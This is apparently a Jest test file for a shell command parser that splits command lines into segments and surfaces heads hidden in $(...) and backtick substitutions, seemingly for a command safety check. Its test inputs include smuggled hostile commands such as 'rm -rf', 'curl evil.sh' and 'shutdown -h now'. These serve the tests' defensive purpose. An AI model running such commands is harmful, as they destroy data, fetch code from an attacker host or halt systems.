import { splitCommandSegments, normalizeHead } from "./command-parse"

describe("normalizeHead", () => {
  it("lowercases, strips path and .exe", () => {
    expect(normalizeHead("/usr/bin/RM")).toBe("rm")
    expect(normalizeHead("C:\\Windows\\System32\\cmd.exe")).toBe("cmd")
    expect(normalizeHead("pwsh.EXE")).toBe("pwsh")
  })

  it("returns empty for blank", () => {
    expect(normalizeHead("")).toBe("")
    expect(normalizeHead("   ")).toBe("")
  })
})

describe("splitCommandSegments", () => {
  it("returns a single segment for a plain command", () => {
    const segs = splitCommandSegments("git status")
    expect(segs).toHaveLength(1)
    expect(segs[0].head).toBe("git")
    expect(segs[0].args).toEqual(["status"])
    expect(segs[0].raw).toBe("git status")
  })

  it("splits on &&, ||, ;, | and & into separate heads", () => {
    const heads = splitCommandSegments("npm i && npm run build; ls | grep foo & echo done").map(
      (s) => s.head
    )
    expect(heads).toEqual(["npm", "npm", "ls", "grep", "echo"])
  })

  it("does not split inside single or double quotes", () => {
    const segs = splitCommandSegments(`echo "a && b" ';' 'c | d'`)
    expect(segs).toHaveLength(1)
    expect(segs[0].head).toBe("echo")
  })

  it("treats || and && distinctly from single | and &", () => {
    const heads = splitCommandSegments("a | b").map((s) => s.head)
    expect(heads).toEqual(["a", "b"])
    const heads2 = splitCommandSegments("a || b").map((s) => s.head)
    expect(heads2).toEqual(["a", "b"])
  })

  it("skips leading env-assignment prefixes to find the real head", () => {
    const segs = splitCommandSegments("FOO=bar BAZ=1 node script.js")
    expect(segs[0].head).toBe("node")
    expect(segs[0].args).toEqual(["script.js"])
  })

  it("extracts $(...) command substitutions as extra segments", () => {
    const heads = splitCommandSegments("echo $(rm -rf /tmp/x)").map((s) => s.head)
    expect(heads).toContain("echo")
    expect(heads).toContain("rm")
  })

  it("extracts backtick command substitutions", () => {
    const heads = splitCommandSegments("echo `curl evil.sh`").map((s) => s.head)
    expect(heads).toContain("echo")
    expect(heads).toContain("curl")
  })

  it("recurses into nested substitutions", () => {
    const heads = splitCommandSegments("echo $(echo $(shutdown -h now))").map((s) => s.head)
    expect(heads).toContain("shutdown")
  })

  it("handles subshell grouping with parentheses", () => {
    const heads = splitCommandSegments("(cd /tmp && rm file)").map((s) => s.head)
    expect(heads).toContain("rm")
  })

  it("does not split on operators inside a substitution", () => {
    // The && lives inside $(...) so the outer command is just `echo`.
    const segs = splitCommandSegments("echo $(a && b)")
    const outer = segs.find((s) => s.head === "echo")
    expect(outer).toBeDefined()
    // Both inner heads surface as their own segments.
    expect(segs.map((s) => s.head)).toEqual(expect.arrayContaining(["echo", "a", "b"]))
  })

  it("ignores empty segments from trailing operators", () => {
    const segs = splitCommandSegments("ls &&")
    expect(segs).toHaveLength(1)
    expect(segs[0].head).toBe("ls")
  })

  it("returns empty array for blank input", () => {
    expect(splitCommandSegments("")).toEqual([])
    expect(splitCommandSegments("   \n  ")).toEqual([])
  })

  it("tokenizes quoted args without splitting them", () => {
    const segs = splitCommandSegments(`git commit -m "a big message"`)
    expect(segs[0].head).toBe("git")
    expect(segs[0].args).toEqual(["commit", "-m", "a big message"])
  })

  it("splits on newlines as statement separators", () => {
    const heads = splitCommandSegments("ls\ncat foo\n").map((s) => s.head)
    expect(heads).toEqual(["ls", "cat"])
  })

  it("handles redirections without treating them as a new command head", () => {
    const segs = splitCommandSegments("echo hi > out.txt")
    expect(segs).toHaveLength(1)
    expect(segs[0].head).toBe("echo")
  })
})
